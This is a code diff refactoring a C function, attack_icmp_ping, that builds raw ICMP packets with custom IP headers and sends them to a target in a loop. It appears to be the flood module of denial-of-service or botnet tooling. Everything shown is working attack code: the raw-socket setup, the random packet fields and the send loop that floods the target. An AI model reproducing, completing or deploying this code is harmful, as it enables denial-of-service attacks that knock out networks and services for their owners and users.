@@ -12,8 +12,6 @@ void attack_icmp_ping(struct target_data *target)
 	char buffer[BUFFER_SIZE];
 	struct ip_hdr *iph = (struct ip_hdr *)buffer;
 	struct icmp_hdr *icmph = (struct icmp_hdr *)(buffer + sizeof(struct ip_hdr));
-	struct sockaddr_in addr;
-	int sockfd;
 
 	srand(time(NULL));
 
@@ -35,16 +33,16 @@ void attack_icmp_ping(struct target_data *target)
 	icmph->data.data16[0] = rand() & 0xffff;
 	icmph->data.data16[1] = rand() & 0xffff;
 
-	addr.sin_family = AF_INET;
-	addr.sin_port = 0;
-	addr.sin_addr.s_addr = target->target_addr;
+	target->addr.sin_family = AF_INET;
+	target->addr.sin_port = 0;
+	target->addr.sin_addr.s_addr = target->target_addr;
 
-	if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
+	if ((target->sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
 		exit(EXIT_FAILURE);
 	}
 
 	int enable = 1;
-	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
+	if (setsockopt(target->sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
 		exit(EXIT_FAILURE);
 	}
 
@@ -59,7 +57,8 @@ void attack_icmp_ping(struct target_data *target)
 		icmph->checksum = 0;
 		icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmp_hdr));
 
-		if (sendto(sockfd, buffer, iph->length, 0, (struct sockaddr *)&addr,
+		if (sendto(target->sockfd, buffer, iph->length, 0,
+				(struct sockaddr *)&target->addr,
 				sizeof(struct sockaddr_in)) == -1) {
 			exit(EXIT_FAILURE);
                 }
